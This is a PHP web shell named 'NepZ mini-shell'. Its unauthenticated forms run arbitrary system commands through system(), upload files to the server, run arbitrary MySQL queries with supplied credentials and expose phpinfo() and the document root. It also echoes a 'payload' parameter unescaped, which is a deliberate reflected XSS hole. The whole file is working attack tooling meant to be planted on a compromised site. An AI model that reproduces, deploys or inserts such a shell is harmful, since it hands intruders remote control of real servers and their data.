<?php
if(isset($_GET['payload'])){
 $payload = $_GET['payload'];
 if(!empty($payload)){
	 echo $payload;
 }else{
  $x = 'It cannot be empty!';
 }
}
 if(isset($_REQUEST['mquery']))
{
    $host=$_REQUEST['host'];
    $usr=$_REQUEST['usr'];
    $passwd=$_REQUEST['passwd'];
    $db=$_REQUEST['db'];
    $mquery=$_REQUEST['mquery'];
    @mysql_connect($host,$usr,$passwd) or die("Connection Error: " . mysql_error());
    mysql_select_db($db);
    $result=mysql_query($mquery);
    if($result!=false)
    {
        echo "<h2>The following query has sucessfully executed</h2>" . htmlentities($mquery) . "<br /><br />";
        echo "Return Results:<br />";
        $first=true;
        echo "<table border='1'>";
        while ($row=mysql_fetch_array($result,MYSQL_ASSOC))
        {
            if($first)
            {
                echo "<tr>";
                foreach($row as $key=>$val)
                {
                    echo "<td><b>$key</b></td>";
                }
                echo "</tr>";
                reset($row);
                $first=false;
            }
            echo "<tr>";
            foreach($row as $val)
            {
                echo "<td>$val</td>";
            }
            echo "</tr>";
        }
        echo "</table>";
        mysql_free_result($result);
    }
    else
    {
        echo "Query Error: " . mysql_error();
    }
}
elseif(isset($_REQUEST['phpinfo']))
{
    phpinfo();
    die();
}
elseif(isset($_POST['bup'])) {
$fl_e = $_FILES['fl']['name'];
$fl_tmp = $_FILES['fl']['tmp_name'];
if (!empty($fl_e)) { 
move_uploaded_file($fl_tmp, $fl_e);
echo "Done";
}
}
elseif(isset($_POST['shell'])){
        $cmd = ($_POST["shell"]);
        if(!empty($cmd)){
        echo '<form method="post" action="">
<input type="text" name="shell"></input>
<button type=submit>submit</button>
</form>';
system($cmd);
        die();
	}
        
    }

    ?>



<!doctype html>
<html>
<head><title>NepZ mini-shell</title></head>
<body>
<div>
<center><h1>NepZ mini-shell</h1></center>
<b>Informations:</b><br />
<i>
Operating System: <?php echo PHP_OS; ?><br />
PHP Version: <?php echo PHP_VERSION; ?>&nbsp;&nbsp;&nbsp;<a href="?phpinfo=true">View phpinfo()</a>
</i>
<br />
<i> Root Directory: <?php echo $_SERVER['DOCUMENT_ROOT']; ?></i> 
</div>
<hr>
<br />
<br />
<div>
Execute Commands: (To know some commands visit site.com/content)
<form method="post" action="">
<input type="text" name="shell"></input>
<button type=submit>submit</button>
</form>

<br />
<hr />
    
<br />
</div>
<div>
UPLOAD FILE: (THE FILE WILL GET UPLOADED AT <?php echo basename(__DIR__);?>) <form action="" method="POST" enctype="multipart/form-data">
	<input type="file" name="fl"><input type="submit" name="bup" value="Go">
</form>
</div>
<hr /> 
<div>
Execute MySQL Query:
<form action="" METHOD="GET">
<table>
<tr><td>host</td><td><input type="text" name="host"value="localhost"></td></tr>
<tr><td>user</td><td><input type="text" name="usr" value="root"></td></tr>
<tr><td>password</td><td><input type="text" name="passwd"></td></tr>
<tr><td>database</td><td><input type="text" name="db"></td></tr>
<tr><td valign="top">query</td><td><textarea name="mquery" rows="6" cols="65"></textarea></td></tr>
<tr><td colspan="2"><input type="submit" value="Execute"></td></tr>
</table>
</form>
</div>
<hr>
<i>XSS payload test </i> 
<form name="xss" method="GET" action="">
<input name="payload" value="<?php if(!empty($x)){ echo $x; } ?>">
<button type="submit"> Test </button>
</form>
<hr>
</body>
</html>
